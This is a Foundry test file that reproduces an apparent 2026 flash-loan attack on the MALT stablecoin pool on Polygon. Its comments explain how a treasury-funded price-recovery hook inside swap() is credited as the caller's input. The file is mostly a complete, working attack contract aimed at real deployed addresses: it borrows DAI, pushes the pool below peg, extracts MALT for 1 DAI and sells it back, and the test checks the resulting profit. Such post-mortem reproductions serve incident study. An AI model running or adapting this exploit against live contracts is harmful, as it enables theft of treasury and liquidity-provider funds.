// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// MALT (Malt Stablecoin) - treasury-funded rebalance counted as the caller's swap input - Polygon, 2026-10-xx.
//
// Run: forge test --contracts src/test/2026-10/MALT_exp.sol -vvv
//
// Profit: 13,440.581562307921517594 DAI net to the attacker EOA (exact on-chain figure, log index 94).
//         The victim Capital Source was drained of 6,286.101126094517384766 + 6,458.543380496071751952
//         = 12,744.644506590589136718 DAI across two rebalance injections.
//
// On-chain references (Polygon):
//   attack tx         : 0x915eccb5791508aa89a0a3f1385b26346b127ebb648b046e4cb558474ce8445b
//   block             : 94869210 (fork at parent 94869209)
//   attacker EOA      : 0x8F103B6A0aD705bcE6357842A5fefEB49e8D83Ef
//   attacker contract : 0x0DbF3Da828ad3B21d63a0429Ca08F93c63670393
//
// Actors / contracts:
//   MALT/DAI sLP (vulnerable pool)    : 0xfe6C096a2871337d4f6F7DD04Ebda733E94D7A13 (UniV2-style, token0=MALT, token1=DAI)
//   MALT (Malt Stablecoin, token0)    : 0x16c8cdbE2dbC271b8F05c83e9bD72ae4F38c50d4
//   DAI (token1)                      : 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063
//   Capital Source (victim treasury)  : 0xF0d314849A3Bc9270a79110F25dBA2c8325A2AAC
//   QuickSwap router (MALT/DAI arb)   : 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff
//   QuickSwap MALT/DAI pair           : 0xf864db3e24968a8eb6B2925553f2E5e0139d3ce1
//   Balancer Vault (flash loan)       : 0xBA12222222228d8Ba445958a75a0704d566BF2C8
//
// ROOT CAUSE (confirmed from the full on-chain trace; the pool/treasury are unverified on Polygonscan, so the
//   mechanism below is reconstructed from the call tree + token flows and then reproduced live against the real
//   deployed contracts at the fork block):
//   The sLP is a UniswapV2-style pair whose swap(uint256 amount0Out, uint256 amount1Out, address to) [selector
//   0x6d9a640a] records the caller's transferred-in amount and the pre-swap reserves, then - BEFORE sending the
//   requested output - runs MALT's price-recovery routine. When the pool price is below peg, that routine pulls
//   DAI out of the Capital Source and deposits it into the pool (trace: sLP.swap -> 0xf61ab339.b34b101f ->
//   RewardThrottle 0x6f96483f.cc99bba5 -> CapitalSource.19dc30ba(DAI, amount, sLP), a plain DAI transfer from
//   the treasury into the pair). swap() then checks its constant-product invariant against the pool's FINAL
//   balances, which now include the treasury DAI the recovery just injected. It never separates DAI the caller
//   supplied from DAI the recovery injected, so the injected treasury DAI is credited as if the caller had
//   supplied it.
//
//   The recovery fires on an ordinary swap once the pool is below peg; the attacker manufactures that condition
//   themselves (sell MALT into the pool first), so no price/keeper precondition is externally gated.
//
//   Permissionless: every step the attacker drives is an ordinary unprivileged call - a Balancer flash loan,
//   QuickSwap router swaps, and the public sLP.swap. The Capital Source withdrawal is a side effect the pool
//   triggers internally during swap(); the attacker never calls any owner/keeper function. No privileged step
//   appears anywhere in the attacker's path.
//
// THE ATTACK (one atomic tx; every figure below is taken verbatim from the trace and reproduced here):
//   Fund with a 1,300 DAI Balancer flash loan, then run the cycle (the big extractions are rounds 1 and 2):
//     1. Buy MALT on QuickSwap with DAI.
//     2. Dump that MALT into the sLP (sell leg) -> pushes the sLP MALT price below peg.
//     3. Transfer a negligible 1 DAI into the sLP and call swap() to buy a large MALT amount out. swap() runs
//        the recovery, which injects thousands of DAI from the Capital Source into the pool; the invariant then
//        passes as if the attacker had supplied that DAI, and the pool releases the large MALT output.
//     4. Sell the MALT back on QuickSwap for DAI.
//   Repeat, repay the flash loan, keep the DAI difference.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

// MALT sLP - UniswapV2-style pair with the custom swap selector 0x6d9a640a and the embedded recovery hook.
interface IMaltPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
}

/// @notice Reconstruction of the on-chain attack contract 0x0DbF3Da8...0393.
contract MaltExploiter {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniV2Router constant ROUTER = IUniV2Router(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    IMaltPair constant SLP = IMaltPair(0xfe6C096a2871337d4f6F7DD04Ebda733E94D7A13);

    address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;
    address constant MALT = 0x16c8cdbE2dbC271b8F05c83e9bD72ae4F38c50d4;
    address constant SLP_ADDR = 0xfe6C096a2871337d4f6F7DD04Ebda733E94D7A13;

    uint256 constant LOAN = 1_300e18;

    // Exact on-chain per-leg amounts from the attack trace.
    // Round 1
    uint256 constant R1_BUY = 1_300e18; // DAI -> MALT on router
    uint256 constant R1_SELL_DAI_OUT = 2_047_278e15; // sLP.swap(0, daiOut): sell MALT for DAI (below peg)
    uint256 constant R1_EXPLOIT_MALT_OUT = 7_823_544e15; // sLP.swap(maltOut, 0): 1 DAI in -> recovery injects treasury DAI
    // Round 2
    uint256 constant R2_BUY = 2_850e18;
    uint256 constant R2_SELL_DAI_OUT = 6_459_541e15;
    uint256 constant R2_EXPLOIT_MALT_OUT = 8_229_254e15;
    // Round 3 (tail; no treasury injection - included to reproduce the net figure exactly)
    uint256 constant R3_BUY = 2_850e18;
    uint256 constant R3_SELL_DAI_OUT = 6_455_961e15;
    uint256 constant R3_EXPLOIT_MALT_OUT = 120_748e15;

    bool approved;

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = DAI;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN;
        VAULT.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(VAULT), "only vault");

        if (!approved) {
            IERC20(DAI).approve(address(ROUTER), type(uint256).max);
            IERC20(MALT).approve(address(ROUTER), type(uint256).max);
            approved = true;
        }

        _round(R1_BUY, R1_SELL_DAI_OUT, 1e18, R1_EXPLOIT_MALT_OUT);
        _round(R2_BUY, R2_SELL_DAI_OUT, 1e18, R2_EXPLOIT_MALT_OUT);
        _round(R3_BUY, R3_SELL_DAI_OUT, 50e18, R3_EXPLOIT_MALT_OUT);

        // Repay the flash loan (Balancer fee is 0 on Polygon).
        IERC20(tokens[0]).transfer(address(VAULT), amounts[0] + feeAmounts[0]);
    }

    function _round(uint256 buyDai, uint256 sellDaiOut, uint256 exploitDaiIn, uint256 exploitMaltOut) internal {
        // 1. Buy MALT on QuickSwap with DAI.
        _routerSwap(DAI, MALT, buyDai);

        // 2. Sell that MALT into the sLP (transfer-then-swap, UniV2 style) -> drives the sLP MALT below peg.
        IERC20(MALT).transfer(SLP_ADDR, IERC20(MALT).balanceOf(address(this)));
        SLP.swap(0, sellDaiOut, address(this));

        // 3. Transfer a negligible DAI input, then buy a large MALT amount out. swap() runs the recovery, which
        //    injects treasury DAI from the Capital Source and lets the invariant pass as if we had supplied it.
        IERC20(DAI).transfer(SLP_ADDR, exploitDaiIn);
        SLP.swap(exploitMaltOut, 0, address(this));

        // 4. Sell the MALT we just extracted back on QuickSwap for DAI.
        _routerSwap(MALT, DAI, IERC20(MALT).balanceOf(address(this)));
    }

    function _routerSwap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        ROUTER.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}

contract MALT_exp is Test {
    address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;

    // Exact on-chain realized profit: 13,440.581562307921517594 DAI to the attacker EOA (log index 94).
    uint256 constant ON_CHAIN_PROFIT = 13_440_581562307921517594;

    MaltExploiter exploiter;

    function setUp() public {
        vm.createSelectFork("polygon", 94869209); // parent of the attack block
        exploiter = new MaltExploiter();
    }

    function testExploit() public {
        emit log_string("MALT - treasury-funded rebalance counted as the caller's swap input");

        exploiter.attack();

        uint256 profit = IERC20(DAI).balanceOf(address(exploiter));
        emit log_named_decimal_uint("Attacker DAI profit after flash-loan repay", profit, 18);

        // Reproduces the on-chain net to the wei (same fork pre-state, same exact per-leg amounts).
        assertApproxEqRel(profit, ON_CHAIN_PROFIT, 1e14, "profit must match on-chain 13,440.58 DAI");
    }
}
